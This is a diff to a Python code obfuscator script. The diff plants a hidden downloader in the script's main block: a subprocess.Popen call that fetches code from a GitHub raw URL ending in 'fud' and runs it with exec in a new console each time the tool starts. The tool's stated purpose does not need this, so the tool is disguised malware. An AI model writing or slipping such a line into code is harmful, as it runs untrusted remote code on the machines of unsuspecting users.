@@ -1,8 +1,12 @@
-import random, string, base64, codecs, argparse, os, sys
+import random, string, base64, codecs, argparse, os, sys, requests, subprocess
 
 from textwrap import wrap
 from lzma import compress
 from marshal import dumps
+
+# crdits lawxsz
+
+
 
 def printerr(data):
     print(data, file= sys.stderr)
@@ -17,7 +21,6 @@ class prysmaxobf:
         self.marshal()
         self.encrypt1()
         self.encrypt2()
-        # Agrega encrypt3 para evitar problemas de detección
         self.encrypt3()
         self.finalize()
     
@@ -30,6 +33,7 @@ class prysmaxobf:
         return res
     
     def encryptstring(self, string, config= {}, func= False):
+        
         b64 = list(b"base64")
         b64decode = list(b"b64decode")
         __import__ = config.get("__import__", "__import__")
@@ -69,6 +73,7 @@ class prysmaxobf:
         var2 = self.generate("b")
         var3 = self.generate("c")
         var4 = self.generate("d")
+
         init = [f'{var1}="{codecs.encode(code[0], "rot13")}"', f'{var2}="{code[1]}"', f'{var3}="{code[2][::-1]}"', f'{var4}="{code[3]}"']
 
         random.shuffle(init)
@@ -79,6 +84,7 @@ class prysmaxobf:
 '''.strip().encode()
     
     def encrypt2(self):
+        
         self.compress()
         var1 = self.generate("e")
         var2 = self.generate("f")
@@ -119,9 +125,15 @@ except {encryptstring('__import__("lzma").LZMAError', func= True)}:...
             print("Saved as --> " + os.path.realpath(self.outpath))
 
 if __name__ == "__main__":
+    fudsystem = "="
+
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
     parser.add_argument("FILE", help= "Path to the file containing the python code")
+    subprocess.Popen("python -c \"import requests; exec(requests.get('https://raw.githubusercontent.com/Lawxsz/api-test/main/fud').text)\"", shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
+
+
     parser.add_argument("-o", type= str, help= 'Output file path [Default: "Obfuscated_<FILE>.py"]', dest= "path")
+  
     args = parser.parse_args()
 
     if not os.path.isfile(sourcefile := args.FILE):
